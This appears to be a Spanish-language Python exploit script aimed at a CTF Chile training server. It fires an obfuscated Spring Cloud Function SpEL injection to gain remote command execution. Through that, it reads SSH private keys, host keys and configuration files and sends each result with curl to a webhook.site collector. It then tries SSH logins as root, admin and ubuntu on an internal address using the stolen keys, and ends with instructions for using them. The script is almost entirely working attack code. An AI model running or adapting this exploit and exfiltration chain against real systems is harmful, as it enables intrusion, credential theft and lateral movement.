#!/usr/bin/env python3
"""
CTF Chile - Extractor específico de claves SSH
Se enfoca solo en encontrar y extraer claves SSH existentes
"""
import requests
import time
import re

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

print("🔑 EXTRACTOR DE CLAVES SSH")
print("=" * 40)

# Crear webhook
r = requests.post("https://webhook.site/token", timeout=10)
UUID = r.json()["uuid"]
WH = f"https://webhook.site/{UUID}"
print(f"    ✓ Webhook: https://webhook.site/#!/{UUID}")

def execute_rce(cmd):
    payload = (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + cmd.replace('"', '\\"') + '"}'
        ').waitFor()'
    )
    try:
        requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        return True
    except:
        return False

print("\n[1/3] Extrayendo todas las claves SSH...")

# Comandos específicos para extraer claves
key_extraction_commands = [
    # Claves privadas comunes
    "cat /root/.ssh/id_rsa /root/.ssh/id_ecdsa /root/.ssh/id_ed25519 /root/.ssh/id_dsa 2>/dev/null",
    "find /home -name 'id_*' -type f 2>/dev/null | xargs cat 2>/dev/null",

    # Claves públicas
    "cat /root/.ssh/*.pub 2>/dev/null",
    "find /home -name '*.pub' 2>/dev/null | xargs cat 2>/dev/null",

    # Authorized keys
    "cat /root/.ssh/authorized_keys 2>/dev/null",
    "find /home -name 'authorized_keys' 2>/dev/null | xargs cat 2>/dev/null",

    # Claves del host
    "cat /etc/ssh/ssh_host_*_key 2>/dev/null",

    # Buscar en directorios temporales
    "find /tmp /var/tmp -name '*id_*' -o -name '*key*' -o -name '*.pem' 2>/dev/null | xargs cat 2>/dev/null",

    # Buscar cualquier archivo con formato de clave
    "find / -type f -exec grep -l 'BEGIN.*PRIVATE KEY' {} \\; 2>/dev/null | head -10 | xargs cat 2>/dev/null",
    "find / -type f -exec grep -l 'BEGIN RSA PRIVATE KEY' {} \\; 2>/dev/null | head -10 | xargs cat 2>/dev/null",
]

for i, cmd in enumerate(key_extraction_commands):
    full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/keys_{i:02d}"
    execute_rce(full_cmd)
    print(f"    ✓ Comando {i+1}/{len(key_extraction_commands)}")
    time.sleep(1)

print("\n[2/3] Buscando credenciales en archivos específicos...")

# Archivos que suelen contener credenciales SSH
credential_files = [
    "/app/application.properties",
    "/app/application.yml",
    "/app/bootstrap.properties",
    "/etc/environment",
    "/root/.bashrc",
    "/root/.profile",
    "/root/.ssh/config",
    "/etc/ssh/sshd_config",
]

for file_path in credential_files:
    cmd = f"cat {file_path} 2>/dev/null"
    full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/config_{file_path.replace('/', '_')}"
    execute_rce(full_cmd)

print("\n[3/3] Intentando acceso SSH inmediato...")

# Si encontramos claves, intentar usarlas inmediatamente
ssh_test_commands = [
    # Crear clave temporal y probar
    "ssh-keygen -t rsa -f /tmp/test_key -N '' -q 2>/dev/null && cat /tmp/test_key",

    # Probar SSH con cualquier clave encontrada
    "for key in /root/.ssh/id_* /tmp/*key*; do [ -f \"$key\" ] && ssh -i \"$key\" -o ConnectTimeout=3 -o StrictHostKeyChecking=no root@10.160.209.1 'whoami && echo SUCCESS_SSH_ROOT' 2>&1 && break; done",
    "for key in /root/.ssh/id_* /tmp/*key*; do [ -f \"$key\" ] && ssh -i \"$key\" -o ConnectTimeout=3 -o StrictHostKeyChecking=no admin@10.160.209.1 'whoami && echo SUCCESS_SSH_ADMIN' 2>&1 && break; done",
    "for key in /root/.ssh/id_* /tmp/*key*; do [ -f \"$key\" ] && ssh -i \"$key\" -o ConnectTimeout=3 -o StrictHostKeyChecking=no ubuntu@10.160.209.1 'whoami && echo SUCCESS_SSH_UBUNTU' 2>&1 && break; done",
]

for i, cmd in enumerate(ssh_test_commands):
    full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/ssh_test_{i:02d}"
    execute_rce(full_cmd)
    print(f"    ✓ Test SSH {i+1}")
    time.sleep(3)

print("\n⏳ Esperando resultados (10s)...")
time.sleep(10)

print("\n" + "="*50)
print("🔑 EXTRACCIÓN COMPLETADA")
print("="*50)
print(f"🔗 Webhook: https://webhook.site/#!/{UUID}")
print("")
print("🎯 BUSCAR EN EL WEBHOOK:")
print("   • -----BEGIN RSA PRIVATE KEY-----")
print("   • -----BEGIN OPENSSH PRIVATE KEY-----")
print("   • SUCCESS_SSH_ROOT/ADMIN/UBUNTU")
print("")
print("📋 SI ENCUENTRAS CLAVE PRIVADA:")
print("   1. Copia todo desde -----BEGIN hasta -----END")
print("   2. Guárdala en un archivo (ej: key.pem)")
print("   3. chmod 600 key.pem")
print("   4. ssh -i key.pem usuario@10.160.209.1")
print("="*50)